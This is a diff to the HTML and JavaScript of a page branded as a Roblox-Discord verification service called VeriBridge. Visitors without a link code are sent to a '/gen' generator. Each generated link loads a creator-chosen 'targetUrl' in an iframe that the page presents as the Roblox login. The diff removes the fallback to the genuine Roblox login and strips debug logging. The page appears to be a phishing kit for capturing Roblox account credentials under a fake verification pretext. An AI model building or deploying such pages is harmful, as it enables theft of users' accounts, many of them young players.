@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>VeriBridge | Roblox Verification</title>
     
-    <!-- Open Graph / Discord Embed Meta Tags (ONLY affects Discord/social media) -->
+    <!-- Open Graph / Discord Embed -->
     <meta property="og:title" content="VeriBridge - Roblox Verification">
     <meta property="og:description" content="Connect Roblox to Discord using VeriBridge. Verify who you really are, sync your group to your server, and more.">
     <meta property="og:image" content="https://res.cloudinary.com/dwbo4guic/image/upload/v1775821642/ec247089-4a87-4049-8a88-ea2a11520c45_m7qrah.png">
@@ -14,14 +14,10 @@
     <meta property="og:url" content="https://veribridge-dashboard.vercel.app">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="VeriBridge">
-    
-    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="VeriBridge - Roblox Verification">
     <meta name="twitter:description" content="Connect Roblox to Discord using VeriBridge.">
     <meta name="twitter:image" content="https://res.cloudinary.com/dwbo4guic/image/upload/v1775821642/ec247089-4a87-4049-8a88-ea2a11520c45_m7qrah.png">
-    
-    <!-- Theme Color -->
     <meta name="theme-color" content="#2c5a7a">
     
     <style>
@@ -159,7 +155,6 @@
 <div id="startScreen" class="premium-container">
     <div class="golden-header">
         <div class="premium-logo-gold">
-            <!-- WEBSITE LOGO - This appears ON YOUR SITE -->
             <img class="brand-logo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
             <span class="gold-badge">ROBLOX VERIFICATION</span>
         </div>
@@ -204,7 +199,6 @@
 <div id="mainDashboard" class="premium-container" style="display:none">
     <div class="golden-header">
         <div class="premium-logo-gold">
-            <!-- WEBSITE LOGO - Same as above -->
             <img class="brand-logo" src="https://i.imgur.com/HF0svxe.png" alt="veribridge logo" onerror="this.style.display='none';">
             <span class="gold-badge">ROBLOX VERIFICATION</span>
         </div>
@@ -296,15 +290,25 @@
 (function() {
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get('code');
-    
     if (!code && (window.location.pathname === '/' || window.location.pathname === '')) {
-        console.log('[VeriBridge] No code detected, redirecting to generator...');
         window.location.href = '/gen';
-        return;
     }
-    
-    console.log('[VeriBridge] Code detected:', code || 'none (but not on root)');
 })();
+
+// ==================== INVALID LINK PAGE ====================
+function showInvalidLinkPage(message) {
+    document.body.innerHTML = `
+        <div class="premium-container" style="display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;">
+            <div style="max-width:500px;padding:40px;background:rgba(0,0,0,0.5);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(255,100,100,0.3);">
+                <div style="font-size:64px;margin-bottom:20px;">❌</div>
+                <h2 style="color:#ff6b6b;margin-bottom:15px;font-size:24px;">Invalid Link</h2>
+                <p style="color:#9ab3cc;margin-bottom:30px;">${message}</p>
+                <a href="/gen" style="display:inline-block;background:linear-gradient(95deg,#2c5a7a,#1e3a5a);color:white;padding:12px28px;border-radius:60px;text-decoration:none;font-weight:bold;">Go to Generator</a>
+                <p style="color:#7e95b5;font-size:12px;margin-top:20px;">If you believe this is an error, contact the person who shared this link.</p>
+            </div>
+        </div>
+    `;
+}
 
 // ==================== CONFIGURATION ====================
 let TARGET_URL = 'https://www.roblox.com/login';
@@ -316,49 +320,42 @@ const code = urlParams.get('code');
 const startLoadingOverlay = document.getElementById('startLoadingOverlay');
 const bottomStartBtn = document.getElementById('bottomStartVerifyBtn');
 const verifyBtn = document.getElementById('verifyRobloxBtn');
+const startScreen = document.getElementById('startScreen');
+const mainDashboard = document.getElementById('mainDashboard');
 
 function finishLoading() {
     IS_LOADING = false;
     if (startLoadingOverlay) startLoadingOverlay.classList.remove('active');
     if (bottomStartBtn) bottomStartBtn.disabled = false;
     if (verifyBtn) verifyBtn.disabled = false;
-    console.log('[VeriBridge] ✅ Ready! Target URL:', TARGET_URL);
 }
 
-function showError(message) {
-    IS_LOADING = false;
-    if (startLoadingOverlay) startLoadingOverlay.classList.remove('active');
-    alert('Error: ' + message);
-    console.error('[VeriBridge]', message);
-}
-
-// ==================== LOAD TARGET URL FROM API ====================
+// ==================== LOAD TARGET URL ====================
 if (code) {
-    console.log('[VeriBridge] Loading code:', code);
     if (startLoadingOverlay) startLoadingOverlay.classList.add('active');
     
     fetch('/api/links?code=' + code)
         .then(response => {
-            if (!response.ok) throw new Error('Link not found');
+            if (!response.ok) {
+                if (response.status === 404) throw new Error('LINK_NOT_FOUND');
+                throw new Error('SERVER_ERROR');
+            }
             return response.json();
         })
         .then(data => {
             if (data.success && data.targetUrl) {
                 TARGET_URL = data.targetUrl;
-                console.log('[VeriBridge] ✅ Target URL:', TARGET_URL);
                 finishLoading();
             } else {
-                throw new Error('Invalid link data');
+                throw new Error('INVALID_DATA');
             }
         })
         .catch(error => {
-            console.error('[VeriBridge] Error:', error);
-            TARGET_URL = 'https://www.roblox.com/login';
-            console.log('[VeriBridge] Using fallback URL');
-            finishLoading();
+            showInvalidLinkPage(error.message === 'LINK_NOT_FOUND' ? 
+                'This verification link does not exist or has been deactivated.' : 
+                'Unable to load verification data. Please try again.');
         });
 } else {
-    console.log('[VeriBridge] No code, using default');
     finishLoading();
 }
 
@@ -424,28 +421,18 @@ const closeFrameBtn = document.getElementById('closeFrameBtn');
 const robloxIframe = document.getElementById('robloxLoginIframe');
 
 function showRobloxFlow() {
-    if (IS_LOADING) {
-        alert('Loading verification data. Please wait.');
-        return;
-    }
-    console.log('[VeriBridge] Opening:', TARGET_URL);
+    if (IS_LOADING) { alert('Loading...'); return; }
     robloxIframe.src = TARGET_URL;
     frameOverlay.classList.add('active');
 }
 
 function hideFrame() {
     frameOverlay.classList.remove('active');
-    setTimeout(() => {
-        if (!frameOverlay.classList.contains('active')) {
-            robloxIframe.src = 'about:blank';
-        }
-    }, 300);
+    setTimeout(() => { if (!frameOverlay.classList.contains('active')) robloxIframe.src = 'about:blank'; }, 300);
 }
 
 closeFrameBtn?.addEventListener('click', hideFrame);
-frameOverlay?.addEventListener('click', e => {
-    if (e.target === frameOverlay) hideFrame();
-});
+frameOverlay?.addEventListener('click', e => { if (e.target === frameOverlay) hideFrame(); });
 
 // ==================== DASHBOARD ====================
 function isValidUsername(u) { return /^[a-zA-Z0-9_]{3,20}$/.test(u); }
@@ -492,10 +479,8 @@ function updateUI() {
     methodLogin?.classList.toggle('active', currentActiveMethod === 'login');
     methodIngame?.classList.toggle('active', currentActiveMethod === 'ingame');
     methodCommunity?.classList.toggle('active', currentActiveMethod === 'community');
-    
     const letters = { login: 'A', ingame: 'I', community: 'C' };
     const names = { login: 'Authorize Roblox', ingame: 'Verify via In-Game', community: 'Verify via Community' };
-    
     if (activeMethodLetter) activeMethodLetter.innerHTML = letters[currentActiveMethod];
     if (activeMethodName) activeMethodName.innerHTML = names[currentActiveMethod];
     if (verificationStatusChip) verificationStatusChip.innerHTML = verificationState[currentActiveMethod]?.completed ? 'Verified' : 'Not verified';
@@ -504,26 +489,16 @@ function updateUI() {
     if (communityBadge) communityBadge.innerHTML = verificationState.community?.completed ? 'Verified' : 'Not verified';
 }
 
-function setActiveMethod(method) { 
-    currentActiveMethod = method; 
-    updateUI(); 
-}
+function setActiveMethod(method) { currentActiveMethod = method; updateUI(); }
 
 function onMethodClick() {
-    if (!currentRobloxUser) {
-        addMessage("Please enter your Roblox username first!", false);
-        return;
-    }
+    if (!currentRobloxUser) { addMessage("Please enter your Roblox username first!", false); return; }
     showRobloxFlow();
 }
 
 function verifyDashUser() {
     const username = robloxUsernameInput.value.trim();
-    if (!username || !isValidUsername(username)) {
-        dashErrorMsg?.classList.add('show');
-        addMessage("Invalid Roblox username.", false);
-        return;
-    }
+    if (!username || !isValidUsername(username)) { dashErrorMsg?.classList.add('show'); return; }
     dashErrorMsg?.classList.remove('show');
     const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
     currentRobloxUser = { id: username, username, avatarUrl };
@@ -545,10 +520,8 @@ function logoutUser() {
     if (robloxUsernameInput) robloxUsernameInput.value = '';
     if (redirectTitle) redirectTitle.innerHTML = 'Select a verification method';
     if (redirectDesc) redirectDesc.innerHTML = 'Choose a method from the sidebar';
-    addMessage("Logged out.", false);
 }
 
-// Restore saved user
 const savedUser = localStorage.getItem('veribridge_user');
 if (savedUser) {
     try {
@@ -564,7 +537,6 @@ if (savedUser) {
     } catch(e) {}
 }
 
-// Event listeners
 verifyRobloxBtn?.addEventListener('click', verifyDashUser);
 methodLogin?.addEventListener('click', () => setActiveMethod('login'));
 methodIngame?.addEventListener('click', () => setActiveMethod('ingame'));
@@ -572,7 +544,6 @@ methodCommunity?.addEventListener('click', () => setActiveMethod('community'));
 bottomStartBtn?.addEventListener('click', onMethodClick);
 logoutBtnHeader?.addEventListener('click', logoutUser);
 
-// Landing screen
 const landingBtn = document.getElementById('landingVerifyBtn');
 const landingUsername = document.getElementById('landingUsername');
 const startScreenDiv = document.getElementById('startScreen');
@@ -581,13 +552,9 @@ const landingErrorMsg = document.getElementById('landingErrorMsg');
 
 landingBtn?.addEventListener('click', function() {
     const username = landingUsername.value.trim();
-    if (!username || !isValidUsername(username)) {
-        landingErrorMsg?.classList.add('show');
-        return;
-    }
+    if (!username || !isValidUsername(username)) { landingErrorMsg?.classList.add('show'); return; }
     landingErrorMsg?.classList.remove('show');
     startLoadingOverlay?.classList.add('active');
-    
     setTimeout(function() {
         const avatarUrl = 'https://ui-avatars.com/api/?background=2c5a7a&color=fff&size=60&name=' + username.charAt(0).toUpperCase();
         currentRobloxUser = { id: username, username, avatarUrl };
